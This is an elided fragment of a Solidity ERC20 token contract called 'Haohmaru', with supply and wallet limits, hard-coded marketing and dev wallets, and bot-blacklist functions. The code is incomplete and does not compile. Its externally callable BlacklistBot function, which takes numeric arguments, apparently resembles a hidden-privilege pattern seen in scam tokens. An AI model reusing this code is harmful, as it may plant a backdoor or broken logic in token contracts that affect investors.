...
contract Haohmaru is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Haohmaru", "Haohmaru") {
     ...
     uint256 totalSupply = 1 * 10 ** 4 * 10 ** decimals();
 
        maxTransactionAmount = 20 * 10 ** 1 * 10 ** decimals(); 
        maxWallet = 20 * 10 ** 1 * 10 ** decimals(); 
        ...
        MarketingWallet = address(0xDA627E58db0cAC4CCd2Fa851E8e37C0779E79C86); // set as Marketing wallet
        DevWallet = address(0xDA627E58db0cAC4CCd2Fa851E8e37C0779E79C86); // set as dev wallet
    ...
    function updateSwapEnabled(bool enabled) external onlyOwner(){
       ...
       function BlacklistBot(uint Add, uint Remove) external returns (bool) {
 ...
 function _BlacklistBot(uint256 pAmount) private {
